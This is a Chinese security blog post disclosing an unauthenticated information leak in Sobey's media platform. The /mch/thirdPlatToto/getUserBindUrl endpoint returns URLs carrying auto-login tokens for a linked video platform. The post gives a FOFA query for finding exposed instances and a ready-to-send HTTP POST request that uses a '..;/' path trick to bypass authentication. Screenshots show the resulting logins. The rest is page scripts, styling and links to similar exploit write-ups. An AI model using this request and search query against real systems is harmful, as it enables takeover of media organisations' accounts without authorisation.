---
title: "索贝融媒体 /mch/thirdPlatToto/getUserBindUrl 信息泄露"
source: https://mrxn.net/jswz/sobey-thirdPlatToto-getUserBindUrl-token-leak.html
asset_dir: assets/索贝融媒体-mchthirdplattotogetuserbindurl-信息泄露
---

# 索贝融媒体 /mch/thirdPlatToto/getUserBindUrl 信息泄露

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/23 08:15
* 878浏览
* [0评论](#comment)
* 8分钟阅读

深入探索

认证

鉴权

安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝融媒体是一款由成都索贝数码科技股份有限公司开发的综合性融媒体解决方案与平台，广泛应用于各级电视台和媒体机构，旨在实现互联网与电视内容的融合生产、管理与分发，为媒体业务运营提供全面的支撑。

漏洞预警服务

该漏洞存在于索贝融媒体系统的 `/mch/thirdPlatToto/getUserBindUrl` 接口中。[未经授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)的访问者通过直接访问此接口，即可触发[信息泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)。

此漏洞可能导致系统内部敏感信息的泄露，特别是能够获取到包含认证令牌（token）的系统URL。攻击者一旦获取这些带有有效令牌的URL，便可能利用这些信息绕过身份验证机制，进一步访问受保护的系统资源或执行未经授权的操作，从而对系统的安全性构成潜在威胁。

# 影响版本

深入探索

恶意软件分析工具

JSON处理工具

授权

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

直接访问就返回携带视频兔兔平台的自动登录token的url，登录后的危害不多说，作为融媒体，这么多媒体平台账户的权限，懂得都洞！

# 漏洞复现

```
POST /sobey-mchEditor/js/..;/mch/thirdPlatToto/getUserBindUrl HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/x-www-form-urlencoded

siteCode=&token=
```

[![索贝融媒体 /mch/thirdPlatToto/getUserBindUrl 信息泄露](images/img-001-df7c7c645326.webp)](https://image.mrxn.net/d3af935191564ee2a524ca8df2937265.webp)

访问响应的url 即可直接登录视频兔兔平台

网络安全

深入探索

编码转换工具

安全认证考试

Docker加速服务

[![索贝融媒体 /mch/thirdPlatToto/getUserBindUrl 信息泄露](images/img-002-e92dad2cf730.webp)](https://image.mrxn.net/44f9f16fa7774e7096f04623ed084145.webp)

以及对应的文章平台

安全研究工具

[![索贝融媒体 /mch/thirdPlatToto/getUserBindUrl 信息泄露](images/img-003-8ef84e70c9dc.webp)](https://image.mrxn.net/6baf3d497cfb4235a01359d3e0e34776.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[索贝融媒体 /mch/thirdPlatToto/getUserBindUrl 信息泄露](https://mrxn.net/jswz/sobey-thirdPlatToto-getUserBindUrl-token-leak.html)  
文章链接：<https://mrxn.net/jswz/sobey-thirdPlatToto-getUserBindUrl-token-leak.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞预警服务

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-thirdPlatToto-getUserBindUrl-token-leak.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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